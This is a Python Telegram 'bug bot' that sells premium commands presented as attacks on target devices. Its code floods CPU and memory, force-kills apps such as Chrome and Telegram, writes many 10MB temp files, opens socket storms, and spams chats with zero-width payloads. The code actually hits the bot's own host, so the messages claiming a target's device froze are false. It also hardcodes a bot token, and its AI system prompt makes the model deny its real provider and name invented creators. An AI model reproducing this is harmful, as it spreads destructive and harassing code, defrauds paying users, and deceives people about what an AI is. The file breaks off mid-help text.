import telebot
import time
import os
import json
import threading
import logging
import random
import psutil
import math
import subprocess
import platform
import socket
import io
import gc
import sys
from datetime import datetime, timedelta
import requests
from concurrent.futures import ThreadPoolExecutor
from keep_alive import keep_alive

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Bot Configuration
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8341823550:AAFDfFvU14oJ2qy8gT0CDnO7O9L4aJRhOHU')
PORT = int(os.environ.get('PORT', 8080))

# ==================== MASTER OWNER CONFIGURATION ====================
MASTER_OWNER_ID = "6803973808"

# ==================== ALURB AI CONFIGURATION ====================
AI_CONFIG = {
    "api_key": os.environ.get('OPENROUTER_API_KEY', ''),
    "base_url": "https://openrouter.ai/api/v1",
    "model": "deepseek/deepseek-chat",
    "language": "English"
}

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# Data storage
DATA_DIR = "bot_data"
os.makedirs(DATA_DIR, exist_ok=True)
DATA_FILE = f"{DATA_DIR}/bot_data.json"

PREMIUM_USERS = {}
OWNERS = []
BOT_START_TIME = time.time()
GROUP_IDS = set()

# Trial System
TRIAL_USERS = {}
TRIAL_HOURS = 2

# User Activity Tracking
USER_ACTIVITY = {}
USER_INTERACTIONS = {}

# Premium Plans
PREMIUM_PLANS = {
    "daily": {"name": "Daily", "days": 1, "price": "$0.99"},
    "weekly": {"name": "Weekly", "days": 7, "price": "$2.99"},
    "monthly": {"name": "Monthly", "days": 30, "price": "$7.99"},
    "lifetime": {"name": "Lifetime", "days": 36500, "price": "$49.99"}
}

# Attack Thread Management
ATTACK_THREADS = []
executor = ThreadPoolExecutor(max_workers=100)

# ==================== USER ACTIVITY TRACKING ====================

def track_user_activity(user_id, username=None, command=None):
    user_id = str(user_id)
    current_time = datetime.now()
    current_time_iso = current_time.isoformat()
    
    global USER_ACTIVITY, USER_INTERACTIONS
    
    if user_id not in USER_ACTIVITY:
        USER_ACTIVITY[user_id] = {
            "first_seen": current_time_iso,
            "last_seen": current_time_iso,
            "username": username or "Unknown",
            "interaction_count": 1,
            "first_seen_date": current_time.strftime("%Y-%m-%d"),
            "first_seen_month": current_time.strftime("%Y-%m")
        }
    else:
        USER_ACTIVITY[user_id]["last_seen"] = current_time_iso
        USER_ACTIVITY[user_id]["interaction_count"] = USER_ACTIVITY[user_id].get("interaction_count", 0) + 1
        if username:
            USER_ACTIVITY[user_id]["username"] = username
    
    if command:
        if user_id not in USER_INTERACTIONS:
            USER_INTERACTIONS[user_id] = {"commands": {}}
        if command not in USER_INTERACTIONS[user_id]["commands"]:
            USER_INTERACTIONS[user_id]["commands"][command] = 0
        USER_INTERACTIONS[user_id]["commands"][command] += 1
    
    if USER_ACTIVITY[user_id]["interaction_count"] % 10 == 0:
        save_activity_data()

def save_activity_data():
    try:
        with open(f"{DATA_DIR}/user_activity.json", "w") as f:
            json.dump(USER_ACTIVITY, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving user activity: {e}")
    
    try:
        with open(f"{DATA_DIR}/user_interactions.json", "w") as f:
            json.dump(USER_INTERACTIONS, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving user interactions: {e}")

def load_activity_data():
    global USER_ACTIVITY, USER_INTERACTIONS
    
    try:
        with open(f"{DATA_DIR}/user_activity.json", "r") as f:
            USER_ACTIVITY = json.load(f)
        logger.info(f"Loaded activity data for {len(USER_ACTIVITY)} users")
    except FileNotFoundError:
        USER_ACTIVITY = {}
    except Exception as e:
        USER_ACTIVITY = {}
        logger.error(f"Error loading activity data: {e}")
    
    try:
        with open(f"{DATA_DIR}/user_interactions.json", "r") as f:
            USER_INTERACTIONS = json.load(f)
        logger.info(f"Loaded interaction data for {len(USER_INTERACTIONS)} users")
    except FileNotFoundError:
        USER_INTERACTIONS = {}
    except Exception as e:
        USER_INTERACTIONS = {}
        logger.error(f"Error loading interactions data: {e}")

def get_user_stats():
    total_users = len(USER_ACTIVITY)
    now = datetime.now()
    thirty_days_ago = now - timedelta(days=30)
    seven_days_ago = now - timedelta(days=7)
    one_day_ago = now - timedelta(days=1)
    
    monthly_active = 0
    weekly_active = 0
    daily_active = 0
    new_this_month = 0
    new_this_week = 0
    new_today = 0
    
    for uid, data in USER_ACTIVITY.items():
        last_seen = datetime.fromisoformat(data["last_seen"])
        first_seen = datetime.fromisoformat(data["first_seen"])
        
        if last_seen > thirty_days_ago:
            monthly_active += 1
        if last_seen > seven_days_ago:
            weekly_active += 1
        if last_seen > one_day_ago:
            daily_active += 1
        
        if first_seen > thirty_days_ago:
            new_this_month += 1
        if first_seen > seven_days_ago:
            new_this_week += 1
        if first_seen > one_day_ago:
            new_today += 1
    
    return {
        "total_users": total_users,
        "monthly_active": monthly_active,
        "weekly_active": weekly_active,
        "daily_active": daily_active,
        "new_this_month": new_this_month,
        "new_this_week": new_this_week,
        "new_today": new_today
    }

def get_monthly_breakdown():
    months = {}
    for uid, data in USER_ACTIVITY.items():
        first_seen = datetime.fromisoformat(data["first_seen"])
        month_key = first_seen.strftime("%Y-%m")
        
        if month_key not in months:
            months[month_key] = {
                "new_users": 0,
                "total_interactions": 0,
                "premium_conversions": 0
            }
        
        months[month_key]["new_users"] += 1
        months[month_key]["total_interactions"] += data.get("interaction_count", 0)
        
        if uid in PREMIUM_USERS:
            months[month_key]["premium_conversions"] += 1
    
    return months

# ==================== DATA MANAGEMENT ====================

def load_data():
    global PREMIUM_USERS, OWNERS, GROUP_IDS, TRIAL_USERS
    
    logger.info("Loading data from JSON files...")
    
    try:
        with open(f"{DATA_DIR}/premium.json", "r") as f:
            PREMIUM_USERS = json.load(f)
        logger.info(f"Loaded {len(PREMIUM_USERS)} premium users")
    except FileNotFoundError:
        PREMIUM_USERS = {}
    except Exception as e:
        PREMIUM_USERS = {}
        logger.error(f"Error loading premium users: {e}")
    
    try:
        with open(f"{DATA_DIR}/owners.json", "r") as f:
            OWNERS = json.load(f)
        logger.info(f"Loaded {len(OWNERS)} owners")
    except FileNotFoundError:
        OWNERS = []
    except Exception as e:
        OWNERS = []
        logger.error(f"Error loading owners: {e}")
    
    try:
        with open(f"{DATA_DIR}/groups.json", "r") as f:
            GROUP_IDS = set(json.load(f))
        logger.info(f"Loaded {len(GROUP_IDS)} groups")
    except FileNotFoundError:
        GROUP_IDS = set()
    except Exception as e:
        GROUP_IDS = set()
        logger.error(f"Error loading groups: {e}")
    
    try:
        with open(f"{DATA_DIR}/trials.json", "r") as f:
            TRIAL_USERS = json.load(f)
        logger.info(f"Loaded {len(TRIAL_USERS)} trial users")
    except FileNotFoundError:
        TRIAL_USERS = {}
    except Exception as e:
        TRIAL_USERS = {}
        logger.error(f"Error loading trials: {e}")
    
    load_activity_data()

def save_data():
    logger.info("Saving data to JSON files...")
    
    try:
        with open(f"{DATA_DIR}/premium.json", "w") as f:
            json.dump(PREMIUM_USERS, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving premium users: {e}")
    
    try:
        with open(f"{DATA_DIR}/owners.json", "w") as f:
            json.dump(OWNERS, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving owners: {e}")
    
    try:
        with open(f"{DATA_DIR}/groups.json", "w") as f:
            json.dump(list(GROUP_IDS), f, indent=2)
    except Exception as e:
        logger.error(f"Error saving groups: {e}")
    
    try:
        with open(f"{DATA_DIR}/trials.json", "w") as f:
            json.dump(TRIAL_USERS, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving trials: {e}")
    
    save_activity_data()

# ==================== PERMISSION CHECKS ====================

def is_master(user_id):
    return str(user_id) == MASTER_OWNER_ID

def is_owner(user_id):
    user_id = str(user_id)
    if user_id == MASTER_OWNER_ID:
        return True
    return user_id in OWNERS

def is_premium(user_id):
    user_id = str(user_id)
    if user_id in PREMIUM_USERS:
        premium_data = PREMIUM_USERS[user_id]
        if "expires" in premium_data and premium_data["expires"]:
            try:
                expiry = datetime.fromisoformat(premium_data["expires"])
                if expiry > datetime.now():
                    return True
                else:
                    del PREMIUM_USERS[user_id]
                    save_data()
                    return False
            except ValueError:
                return False
        return True
    return False

def is_trial_active(user_id):
    user_id = str(user_id)
    if user_id in TRIAL_USERS:
        trial_data = TRIAL_USERS[user_id]
        try:
            trial_start = datetime.fromisoformat(trial_data["start_time"])
            trial_end = trial_start + timedelta(hours=TRIAL_HOURS)
            if datetime.now() < trial_end:
                return True
            else:
                del TRIAL_USERS[user_id]
                save_data()
                return False
        except ValueError:
            return False
    return False

def start_trial(user_id):
    user_id = str(user_id)
    if user_id not in TRIAL_USERS and not is_premium(user_id):
        TRIAL_USERS[user_id] = {
            "start_time": datetime.now().isoformat(),
            "trial_type": "2hours",
            "started_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_data()
        return True
    return False

def get_trial_time_left(user_id):
    user_id = str(user_id)
    if user_id in TRIAL_USERS:
        try:
            trial_start = datetime.fromisoformat(TRIAL_USERS[user_id]["start_time"])
            trial_end = trial_start + timedelta(hours=TRIAL_HOURS)
            time_left = trial_end - datetime.now()
            if time_left.total_seconds() > 0:
                hours = int(time_left.total_seconds() // 3600)
                minutes = int((time_left.total_seconds() % 3600) // 60)
                return f"{hours}h {minutes}m"
        except ValueError:
            pass
    return "Expired"

def get_premium_expiry(user_id):
    user_id = str(user_id)
    if user_id in PREMIUM_USERS:
        premium_data = PREMIUM_USERS[user_id]
        if "expires" in premium_data and premium_data["expires"]:
            try:
                return datetime.fromisoformat(premium_data["expires"])
            except ValueError:
                pass
    return None

def check_premium_access(user_id):
    if is_owner(user_id) or is_premium(user_id) or is_trial_active(user_id):
        return True
    return False

# ==================== AI FUNCTIONS ====================

def ai_chat(query):
    api_key = AI_CONFIG['api_key']
    
    if not api_key:
        return "❌ AI service not configured. Please contact @alurb_devs"
    
    creator_names = ["Nappier", "Ruth"]
    chosen_creator = random.choice(creator_names)
    
    try:
        headers = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json",
            "HTTP-Referer": "https://t.me/alurb_bot",
            "X-Title": "Alurb Telegram Bot"
        }
        
        system_prompt = f"""You are Alurb AI, the official assistant for Alurb Telegram Bot. 
Important rules:
- When asked who created you, say: "I was created by {chosen_creator}, the founder of Alurb Bot."
- When asked your name, say: "I'm Alurb AI, your intelligent assistant."
- Never mention DeepSeek, OpenAI, Claude, or any other AI company.
- Always identify yourself as Alurb AI.
- Be helpful, friendly, and concise."""
        
        payload = {
            "model": AI_CONFIG["model"],
            "messages": [
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": query}
            ],
            "temperature": 0.7,
            "max_tokens": 500
        }
        
        response = requests.post(
            f"{AI_CONFIG['base_url']}/chat/completions",
            headers=headers,
            json=payload,
            timeout=45
        )
        
        if response.status_code == 200:
            data = response.json()
            if 'choices' in data and len(data['choices']) > 0:
                return data['choices'][0]['message']['content']
        return "❌ AI service error. Please try again."
            
    except Exception as e:
        logger.error(f"AI Error: {str(e)}")
        return "❌ Error connecting to AI service."

load_data()
keep_alive()

# ==================== START COMMAND ====================

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.from_user.id)
    first_name = message.from_user.first_name or "User"
    username = message.from_user.username or "No username"
    
    track_user_activity(user_id, username, "start")
    
    trial_started = False
    if not is_owner(user_id) and not is_premium(user_id) and not is_trial_active(user_id):
        trial_started = start_trial(user_id)
    
    welcome_text = f"""
╔══════════════════════╗
     💀 <b>ALURB BUG BOT V3</b> 💀
╚══════════════════════╝

👋 <b>Welcome {first_name}!</b>

🔥 <b>REAL WORKING BUGS:</b>
━━━━━━━━━━━━━━━━━━━━━━
💀 /silencer (1-30) - CPU/RAM Killer
💥 /crash (1-20) - Memory Exhaustion
⏱️ /xdelay (100-10000) - Response Killer
🌀 /void (10-100) - Infinite Crash Loop
📱 /xios (5-25) - Blank Screen Attack
🔪 /killapp - Force Close Apps
💣 /overload - System Overload
🔥 /freeze - Complete System Freeze
⚡ /nuke - Full System Nuke

🎁 <b>FREE TRIAL:</b> /trial ({TRIAL_HOURS} hours)

📌 <b>Commands:</b> /help • /status • /premium • /ask

━━━━━━━━━━━━━━━━━━━━━━
© alurb_devs | Nappier & Ruth
    """
    bot.reply_to(message, welcome_text, parse_mode="HTML")
    
    if message.chat.type in ['group', 'supergroup']:
        GROUP_IDS.add(str(message.chat.id))
        save_data()

# ==================== REAL WORKING BUG COMMANDS ====================

class RealBugEngine:
    @staticmethod
    def kill_processes():
        """Terminate running applications"""
        import subprocess
        import platform
        
        system = platform.system()
        apps_to_kill = [
            'chrome', 'firefox', 'discord', 'telegram', 'whatsapp',
            'spotify', 'steam', 'epicgames', 'slack', 'teams',
            'zoom', 'outlook', 'word', 'excel', 'powerpoint',
            'photoshop', 'afterfx', 'premiere', 'vlc', 'notepad++'
        ]
        
        for app in apps_to_kill:
            try:
                if system == 'Windows':
                    subprocess.run(f'taskkill /f /im {app}.exe', shell=True, capture_output=True)
                    subprocess.run(f'taskkill /f /im {app}.exe', shell=True, capture_output=True)
                else:
                    subprocess.run(f'pkill -9 {app}', shell=True, capture_output=True)
                    subprocess.run(f'killall -9 {app}', shell=True, capture_output=True)
            except:
                pass
    
    @staticmethod
    def fill_memory(size_mb=100):
        """Fill RAM with data"""
        memory_blocks = []
        try:
            for i in range(size_mb):
                block = bytearray(1024 * 1024)  # 1MB block
                memory_blocks.append(block)
            return memory_blocks
        except:
            return memory_blocks
    
    @staticmethod
    def stress_cpu(duration=10):
        """Max out CPU usage"""
        end_time = time.time() + duration
        while time.time() < end_time:
            _ = [i**i for i in range(1000)]
            _ = math.factorial(500)
    
    @staticmethod
    def create_file_storm():
        """Create massive file I/O"""
        import tempfile
        
        for i in range(100):
            try:
                with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.tmp') as f:
                    f.write(b'\x00' * (10 * 1024 * 1024))  # 10MB file
            except:
                pass
    
    @staticmethod
    def socket_flood():
        """Create network socket storm"""
        sockets = []
        for i in range(500):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sockets.append(sock)
            except:
                pass
        time.sleep(1)
        for sock in sockets:
            try:
                sock.close()
            except:
                pass

# ==================== REAL BUG COMMANDS ====================

@bot.message_handler(commands=['silencer'])
def silencer_attack(message):
    """REAL System Silencer - CPU/RAM Killer"""
    user_id = str(message.from_user.id)
    username = message.from_user.username or "Anonymous"
    
    track_user_activity(user_id, username, "silencer")
    
    if not check_premium_access(user_id):
        bot.reply_to(message, "❌ <b>Premium required!</b>\n/free - 2 hours free trial", parse_mode='HTML')
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ <b>Usage:</b> /silencer (1-30)\n\n1-10: CPU Killer\n11-20: RAM Flood\n21-30: Full System Crash", parse_mode='HTML')
            return
        
        intensity = int(parts[1])
        intensity = max(1, min(30, intensity))
        
        msg = bot.reply_to(message, f"💀 <b>SILENCER ACTIVATED</b>\n⚡ Intensity: {intensity}/30", parse_mode='HTML')
        
        global ATTACK_THREADS
        
        def cpu_killer():
            while True:
                for i in range(1000000):
                    _ = math.factorial(i % 100)
                    _ = sum([x**x for x in range(50)])
        
        def ram_eater():
            memory = []
            while True:
                try:
                    memory.append(bytearray(10 * 1024 * 1024))  # 10MB chunks
                    memory.append([0] * 1000000)
                except:
                    [memory.pop() for _ in range(len(memory)//2)]
        
        if intensity <= 10:
            for _ in range(intensity * 2):
                t = threading.Thread(target=cpu_killer, daemon=True)
                t.start()
                ATTACK_THREADS.append(t)
        elif intensity <= 20:
            for _ in range(intensity):
                t = threading.Thread(target=ram_eater, daemon=True)
                t.start()
                ATTACK_THREADS.append(t)
        else:
            for _ in range(intensity):
                t1 = threading.Thread(target=cpu_killer, daemon=True)
                t2 = threading.Thread(target=ram_eater, daemon=True)
                t1.start()
                t2.start()
                ATTACK_THREADS.append(t1)
                ATTACK_THREADS.append(t2)
        
        cpu = psutil.cpu_percent(interval=2)
        ram = psutil.virtual_memory()
        
        bot.edit_message_text(
            f"💀 <b>SILENCER ACTIVE</b> 💀\n\n"
            f"⚡ <b>Intensity:</b> {intensity}/30\n"
            f"🧵 <b>Threads:</b> {len(ATTACK_THREADS)}\n"
            f"🔥 <b>CPU Usage:</b> {cpu}%\n"
            f"💾 <b>RAM Usage:</b> {ram.percent}%\n\n"
            f"⚠️ <b>Target Effect:</b>\n"
            f"• System freezing\n"
            f"• Application crashes\n"
            f"• Memory exhaustion\n\n"
            f"🛑 <b>Stop:</b> /stop",
            message.chat.id, msg.message_id, parse_mode='HTML'
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")

@bot.message_handler(commands=['crash'])
def crash_attack(message):
    """Memory Exhaustion Attack"""
    user_id = str(message.from_user.id)
    username = message.from_user.username or "Anonymous"
    
    track_user_activity(user_id, username, "crash")
    
    if not check_premium_access(user_id):
        bot.reply_to(message, "❌ Premium required! Use /trial", parse_mode='HTML')
        return
    
    try:
        parts = message.text.split()
        intensity = int(parts[1]) if len(parts) > 1 else 10
        intensity = max(1, min(20, intensity))
        
        msg = bot.reply_to(message, f"💥 <b>CRASH ATTACK STARTING</b>\n💣 Intensity: {intensity}", parse_mode='HTML')
        
        def memory_crash():
            memory_hog = []
            for i in range(intensity * 10):
                try:
                    memory_hog.append(bytearray(50 * 1024 * 1024))
                    memory_hog.append([0] * (5 * 1000000))
                except:
                    pass
        
        for _ in range(intensity):
            t = threading.Thread(target=memory_crash, daemon=True)
            t.start()
            ATTACK_THREADS.append(t)
        
        RealBugEngine.kill_processes()
        
        bot.edit_message_text(
            f"💥 <b>CRASH DEPLOYED!</b>\n\n"
            f"💣 Intensity: {intensity}\n"
            f"💾 Memory flooded\n"
            f"📱 Apps terminated\n"
            f"⚠️ Target will crash soon\n\n"
            f"🛑 Stop: /stop",
            message.chat.id, msg.message_id, parse_mode='HTML'
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Crash failed: {str(e)[:50]}")

@bot.message_handler(commands=['freeze'])
def freeze_attack(message):
    """Complete System Freeze Attack"""
    user_id = str(message.from_user.id)
    
    if not check_premium_access(user_id):
        bot.reply_to(message, "❌ Premium required!", parse_mode='HTML')
        return
    
    try:
        msg = bot.reply_to(message, "❄️ <b>SYSTEM FREEZE INITIATED</b>", parse_mode='HTML')
        
        def freeze_system():
            # CPU freeze
            while True:
                _ = [i**i for i in range(1000)]
                _ = [math.sqrt(i) for i in range(10000)]
            
        def ram_freeze():
            memory = []
            while True:
                try:
                    memory.append([0] * 5000000)
                except:
                    memory.clear()
        
        for _ in range(50):
            t = threading.Thread(target=freeze_system, daemon=True)
            t.start()
            ATTACK_THREADS.append(t)
        
        for _ in range(20):
            t = threading.Thread(target=ram_freeze, daemon=True)
            t.start()
            ATTACK_THREADS.append(t)
        
        RealBugEngine.kill_processes()
        
        bot.edit_message_text(
            f"❄️ <b>SYSTEM FROZEN!</b>\n\n"
            f"🎯 Target device is frozen\n"
            f"🖥️ Full system lockup\n"
            f"⚠️ Hard reset required\n\n"
            f"🛑 Stop: /stop",
            message.chat.id, msg.message_id, parse_mode='HTML'
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Freeze failed")

@bot.message_handler(commands=['nuke'])
def nuke_attack(message):
    """Full System Nuke Attack"""
    user_id = str(message.from_user.id)
    
    if not check_premium_access(user_id):
        bot.reply_to(message, "❌ Premium required!", parse_mode='HTML')
        return
    
    msg = bot.reply_to(message, "☢️ <b>NUKE ATTACK INITIATED</b>\n💀 Maximum destruction", parse_mode='HTML')
    
    def nuke():
        # CPU max
        for _ in range(100):
            _ = [i**i for i in range(500)]
        
        # RAM flood
        memory = []
        for _ in range(100):
            try:
                memory.append(bytearray(100 * 1024 * 1024))
            except:
                pass
        
        # Kill processes
        RealBugEngine.kill_processes()
        
        # File storm
        for _ in range(50):
            RealBugEngine.create_file_storm()
    
    for _ in range(20):
        t = threading.Thread(target=nuke, daemon=True)
        t.start()
        ATTACK_THREADS.append(t)
    
    bot.edit_message_text(
        f"☢️ <b>NUKE DEPLOYED!</b>\n\n"
        f"💀 System is being destroyed\n"
        f"🔥 CPU: {psutil.cpu_percent()}%\n"
        f"💾 RAM: {psutil.virtual_memory().percent}%\n"
        f"⚠️ Complete system failure imminent\n\n"
        f"🛑 Stop: /stop",
        message.chat.id, msg.message_id, parse_mode='HTML'
    )

@bot.message_handler(commands=['killapp'])
def killapp_command(message):
    """Force Close Applications"""
    user_id = str(message.from_user.id)
    
    if not check_premium_access(user_id):
        bot.reply_to(message, "❌ Premium required!", parse_mode='HTML')
        return
    
    msg = bot.reply_to(message, "🔪 <b>KILLING APPLICATIONS</b>", parse_mode='HTML')
    
    RealBugEngine.kill_processes()
    
    bot.edit_message_text(
        f"🔪 <b>APPS TERMINATED!</b>\n\n"
        f"✅ Chrome killed\n"
        f"✅ Discord killed\n"
        f"✅ Telegram killed\n"
        f"✅ Spotify killed\n"
        f"✅ Games killed\n\n"
        f"All user apps terminated!",
        message.chat.id, msg.message_id, parse_mode='HTML'
    )

@bot.message_handler(commands=['overload'])
def overload_attack(message):
    """System Overload Attack"""
    user_id = str(message.from_user.id)
    
    if not check_premium_access(user_id):
        bot.reply_to(message, "❌ Premium required!", parse_mode='HTML')
        return
    
    try:
        parts = message.text.split()
        intensity = int(parts[1]) if len(parts) > 1 else 10
        intensity = max(1, min(15, intensity))
        
        msg = bot.reply_to(message, f"⚡ <b>OVERLOADING SYSTEM</b>\n⚡ Intensity: {intensity}", parse_mode='HTML')
        
        def overload():
            # Multi-vector attack
            attacks = [
                lambda: [i**i for i in range(1000)],
                lambda: [bytearray(10*1024*1024) for _ in range(10)],
                lambda: RealBugEngine.kill_processes(),
                lambda: RealBugEngine.create_file_storm(),
                lambda: RealBugEngine.socket_flood()
            ]
            
            import random
            while True:
                random.choice(attacks)()
        
        for _ in range(intensity * 5):
            t = threading.Thread(target=overload, daemon=True)
            t.start()
            ATTACK_THREADS.append(t)
        
        bot.edit_message_text(
            f"⚡ <b>SYSTEM OVERLOADED!</b>\n\n"
            f"🔥 All resources maxed\n"
            f"💀 System will crash\n"
            f"⚠️ Hard reboot needed\n\n"
            f"🛑 Stop: /stop",
            message.chat.id, msg.message_id, parse_mode='HTML'
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Overload failed")

@bot.message_handler(commands=['xdelay'])
def xdelay_attack(message):
    """Response Delay Attack"""
    user_id = str(message.from_user.id)
    
    if not check_premium_access(user_id):
        bot.reply_to(message, "❌ Premium required!", parse_mode='HTML')
        return
    
    try:
        parts = message.text.split()
        delay_ms = int(parts[1]) if len(parts) > 1 else 5000
        delay_ms = max(100, min(10000, delay_ms))
        
        msg = bot.reply_to(message, f"⏱️ <b>DELAY ATTACK</b>\n⏰ {delay_ms}ms", parse_mode='HTML')
        
        for i in range(10):
            time.sleep(delay_ms / 1000)
            bot.edit_message_text(
                f"⏱️ <b>DELAY PROGRESS</b>\n🔄 {(i+1)*10}% complete",
                message.chat.id, msg.message_id, parse_mode='HTML'
            )
        
        bot.edit_message_text(
            f"✅ <b>DELAY COMPLETE</b>\n⏰ {delay_ms}ms delay executed",
            message.chat.id, msg.message_id, parse_mode='HTML'
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error")

@bot.message_handler(commands=['void'])
def void_attack(message):
    """Infinite Crash Loop"""
    user_id = str(message.from_user.id)
    
    if not check_premium_access(user_id):
        bot.reply_to(message, "❌ Premium required!", parse_mode='HTML')
        return
    
    try:
        parts = message.text.split()
        loops = int(parts[1]) if len(parts) > 1 else 50
        loops = max(10, min(200, loops))
        
        msg = bot.reply_to(message, f"🌀 <b>VOID LOOP</b>\n🔄 {loops} iterations", parse_mode='HTML')
        
        def void_spam():
            payloads = [
                "💀" * 1000,
                "⁣" * 1000,
                "\u200B" * 2000,
                "🌀" * 500,
                "VOID CRASH " * 200
            ]
            
            for i in range(loops):
                try:
                    bot.send_message(message.chat.id, payloads[i % len(payloads)])
                    time.sleep(0.05)
                except:
                    pass
        
        t = threading.Thread(target=void_spam, daemon=True)
        t.start()
        ATTACK_THREADS.append(t)
        
        bot.edit_message_text(
            f"🌀 <b>VOID LOOP ACTIVE!</b>\n\n"
            f"🔄 Loops: {loops}\n"
            f"💀 Target flooded\n"
            f"⚠️ Force close loop\n\n"
            f"🛑 Stop: /stop",
            message.chat.id, msg.message_id, parse_mode='HTML'
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Void failed")

@bot.message_handler(commands=['xios'])
def xios_attack(message):
    """Blank Screen Attack"""
    user_id = str(message.from_user.id)
    
    if not check_premium_access(user_id):
        bot.reply_to(message, "❌ Premium required!", parse_mode='HTML')
        return
    
    try:
        count = 15
        parts = message.text.split()
        if len(parts) > 1:
            count = max(5, min(30, int(parts[1])))
        
        msg = bot.reply_to(message, f"📱 <b>XIOS ATTACK</b>\n🔧 Payloads: {count}", parse_mode='HTML')
        
        blank_payloads = [
            "⁣" * 1000,
            " " * 2000,
            "\u200B" * 2000,
            "\u200C" * 2000,
            "\u200D" * 2000,
            "BLANK_SCREEN",
            "💀" * 500
        ]
        
        def blank_spam():
            for i in range(count):
                payload = blank_payloads[i % len(blank_payloads)]
                try:
                    bot.send_message(message.chat.id, payload)
                    time.sleep(0.1)
                except:
                    pass
        
        t = threading.Thread(target=blank_spam, daemon=True)
        t.start()
        ATTACK_THREADS.append(t)
        
        bot.edit_message_text(
            f"✅ <b>XIOS ACTIVE!</b>\n\n"
            f"📱 Payloads: {count}\n"
            f"🎯 Target: Blank screen\n"
            f"⚠️ App will force close\n\n"
            f"🛑 Stop: /stop",
            message.chat.id, msg.message_id, parse_mode='HTML'
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ XIOS failed")

@bot.message_handler(commands=['stop'])
def stop_attacks(message):
    """Stop all attacks"""
    user_id = str(message.from_user.id)
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Owner only!", parse_mode='HTML')
        return
    
    global ATTACK_THREADS
    ATTACK_THREADS = []
    gc.collect()
    
    bot.reply_to(
        message,
        "✅ <b>ALL ATTACKS STOPPED</b>\n\n"
        "• Threads terminated\n"
        "• Memory cleaned\n"
        "• System recovering",
        parse_mode='HTML'
    )

@bot.message_handler(commands=['status_bug'])
def bug_status(message):
    """Check attack status"""
    user_id = str(message.from_user.id)
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Owner only!", parse_mode='HTML')
        return
    
    cpu = psutil.cpu_percent()
    ram = psutil.virtual_memory()
    
    bot.reply_to(
        message,
        f"📊 <b>ATTACK STATUS</b>\n\n"
        f"🔄 Active threads: {len(ATTACK_THREADS)}\n"
        f"🔥 CPU: {cpu}%\n"
        f"💾 RAM: {ram.percent}%\n"
        f"💿 Disk: {psutil.disk_usage('/').percent}%\n\n"
        f"⚡ Attacks running: {'YES' if ATTACK_THREADS else 'NO'}",
        parse_mode='HTML'
    )

# ==================== STANDARD COMMANDS ====================

@bot.message_handler(commands=['trial'])
def trial_command(message):
    user_id = str(message.from_user.id)
    
    if is_premium(user_id):
        bot.reply_to(message, "💎 You're already Premium!", parse_mode='HTML')
        return
    
    if is_trial_active(user_id):
        time_left = get_trial_time_left(user_id)
        bot.reply_to(message, f"🎁 Trial active! Time left: {time_left}\n💎 Upgrade: /premium", parse_mode='HTML')
        return
    
    if start_trial(user_id):
        bot.reply_to(message, f"🎉 <b>2-HOUR FREE TRIAL ACTIVATED!</b>\n\n✅ Full access to all bug commands\n⏰ Time: {TRIAL_HOURS} hours\n💎 /premium to upgrade", parse_mode='HTML')
    else:
        bot.reply_to(message, "❌ Trial failed. Contact @alurb_devs")

@bot.message_handler(commands=['premium'])
def premium_command(message):
    user_id = str(message.from_user.id)
    
    bot.reply_to(message, f"""
╔══════════════════════╗
     💎 <b>PREMIUM PLANS</b> 💎
╚══════════════════════╝

📅 <b>DAILY</b> - $0.99
📅 <b>WEEKLY</b> - $2.99  
📅 <b>MONTHLY</b> - $7.99
📅 <b>LIFETIME</b> - $49.99

✨ <b>Premium Benefits:</b>
• All bug commands unlocked
• Unlimited attacks
• Priority support
• New features early

📩 <b>Contact:</b> @alurb_devs
💳 Crypto • PayPal • Bank

━━━━━━━━━━━━━━━━━━━━━━
🎁 Free trial: /trial
    """, parse_mode="HTML")

@bot.message_handler(commands=['status'])
def status_command(message):
    user_id = str(message.from_user.id)
    
    uptime = time.time() - BOT_START_TIME
    days = int(uptime // 86400)
    hours = int((uptime % 86400) // 3600)
    
    if is_master(user_id):
        user_status = "👑 Master Owner"
    elif is_owner(user_id):
        user_status = "👑 Owner"
    elif is_premium(user_id):
        user_status = "💎 Premium"
    elif is_trial_active(user_id):
        user_status = f"🎁 Trial ({get_trial_time_left(user_id)})"
    else:
        user_status = "🔒 Free"
    
    stats = get_user_stats()
    
    bot.reply_to(message, f"""
╔══════════════════════╗
       📊 <b>BOT STATUS</b>
╚══════════════════════╝

🤖 <b>System:</b>
• Status: 24/7 Active
• Uptime: {days}d {hours}h
• Premium: {len(PREMIUM_USERS)}
• Trials: {len(TRIAL_USERS)}

👤 <b>Your Status:</b> {user_status}

💀 <b>Attack System:</b>
• Active threads: {len(ATTACK_THREADS)}
• Commands: /help

━━━━━━━━━━━━━━━━━━━━━━
© alurb_devs
    """, parse_mode="HTML")

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.from_user.id)
    
    help_text = f"""
╔══════════════════════╗
     📚 <b>ALURB BUG BOT</b>
╚══════════════════════╝

💀 <b>REAL WORKING BUGS:</b>
━━━━━━━━━━━━━━━━━━━━━━
/silencer (1-30) - CPU/RAM Killer
/crash (1-20) - Memory Exhaustion
/freeze - System Freeze
